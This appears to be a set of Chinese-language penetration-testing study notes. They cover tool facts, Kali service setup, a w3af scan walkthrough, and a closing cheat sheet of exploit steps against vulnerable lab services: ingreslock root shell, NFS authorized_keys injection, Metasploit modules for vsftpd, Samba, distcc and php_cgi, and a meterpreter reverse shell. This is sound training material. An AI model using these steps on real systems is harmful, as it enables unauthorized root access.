# Question
Apache 默认端口号80   
XProbe2通过 模糊签名猜测，可能性猜测 同时多匹配和签名数据库来识别操作系统   
W3af框架有漏洞挖掘（discovery）、漏洞分析（audit）和漏洞攻击（attack）三种功能   
burpsuite默认参数127.0.0.1 8080   
burp spider主要是抓取目标网站  (抓包send to spider)   
burp Intruder主要功能是 自动实施各种定制攻击
Sqlmap的注入技术基本全部覆盖
在 /etc/passwd中，/bin/bash代表账户可登录
nmap中 -sU扫UDP -sS SYN扫描 -sT tcp扫描，取首字母，以此类推
mysql默认端口 3306


# 配置网卡信息 #
```
配置文件 nano /etc/network/interfaces

iface eth0 inet static           //配置eth0使用默认的静态地址
address 172.30.1.160        //设置eth0的IP地址
netmask 255.255.0.0        //配置eth0的子网掩码
```
采用静态IP地址的方式，还需要手动设置DNS配置文件，在终端中输入命令
```
nano /etc/resolv.conf
```
输入DNS地址，上述都设置完毕后，重启一下系统
# SSH and Apache #
## 配置SSH ##
```
nano /etc/ssh/ssd_config
```
去掉注释
```
#passwordAuthentication yes
```
开启服务
```
service ssh start
/etc/init.d/ssh start
```
## 配置Apache ##
配置文件
```
nano /etc/apache2/ports.conf 修改默认端口号
```
开启服务
```
service apache2 start
/etc/init.d/apache2 start
```
# 渗透测试过程 #
- 第一步：目标范围划定
- 第二步：信息搜集
- 第三步：目标发现
- 第四歩：目标枚举
- 第五步：漏洞映射
- 第六步：社会工程学
- 第七步：漏洞利用
- 第八步：提权
- 第九步：持续控制目标
- 第十步：文档和报告

# W3af_consle #
|方式|作用|
## 基本操作 ##
|-|-|
|view |查看参数|
|set| 改变参数值|
|back |返回上一级|
|help |查看帮助|
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089536147240401.jpg)
## 探测网站目录结构 ##
2.1	在终端中输入命令“w3af_console”，启动w3af。如图7所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089540666961901.png)

2.2	启动插件。如图8所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089542296669401.png)


2.3	启用find_backdoors、phpinfo和web_spider这三个插件。如图9所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089545129434501.png)


2.4	列出所有用于漏洞的插件。如图10所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089546880790701.png)


2.5	启用blind_sqli、file_upload、os_commanding、sqli和xss这五个插件。如图11所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089552047428201.png)

2.6	设置输出插件。如图12所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089553599742601.png)


2.7	设置输出信息的存储文件。如图13所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089554994280701.jpg)

2.8	查看存储设置参数。如图14所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089556694288901.png)

2.9	设置目标地址参数。如图15所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089557765750301.png)

2.10	开始攻击。如图16所示   
![](http://tjxxaq.shiyanbar.com/UploadImage/2016/7/26/154089560841997901.png)
# 后门利用 #
## Ingreslock后门 ##
**Port:**  1524
```
telnet ip 1524   直接获取root权限
```
## Linux NFS共享目录配置漏洞 ##
Step1：查看目标主机上NFS服务是否开启：   
```
rpcinfo -p 192.168.1.3   
```   
Step2:显示指定的远程共享目录列表：   
```
showmount -e 192.168.1.3
```   
Step3:生成rsa公钥：   
```
ssh-keygen
```   
Step4:
```
mkdir /tmp/tool 建立tool目录   
mount -t nfs 192.168.1.3:/tmp/tool,把192.168.1.3根目录挂载到/tmp/tool目录下   
```    
Step5：把生成的公钥追加到靶机的authorized_keys下，实现ssh免密码登录：
```
cat  /root/.ssh/id_rsa.pub>>/tmp/tool/root/.ssh/authorized_keys
```
Step6:连接
```
ssh root@ip
```
## Metasploit溢出vsftp特权提升漏洞 ##
**Port:**  21   
**Payload:** `use exploit/unix/ftp/vsftpd_234_backdoor`
## Metasploit溢出UnrealIRCd后门漏洞 ##
**Port:** 6667
## Tomcat管理台默认口令漏洞 ##
**Port:** 8180    
**Service:** ApacheTomcat/CoyoteJSP engine1.1   
**Default:** tomcat tomcat
## sysmlink 默认配置目录遍历漏洞 ##
**Port:** 445 139   
**Service:** Samba   
**Payload:** auxiliary/admin/smb/samba_symlink_traversal
```
set SMBSHARE tmp SAM可写文件
smbclient //ip/tmp 
cd rootfs 进入root目录
cat /*
```
## Samba提权漏洞 ##
**Port:** 445 139
```
use exploit/multi/samba/usermap_script
```
## Metasploit利用php_cgi漏洞 ##
**Dir:** cgi-bin   
**Exploit:** exploit/multi/php_cgi_arg_injection   
**Payload:**   
```
set PAYLOAD /php/meterpreter/reverse_tcp
```
## Distcc后门漏洞 ##
**Port:** 3632   
**Exploit:** use exploit/unix/misc/distcc_exec   
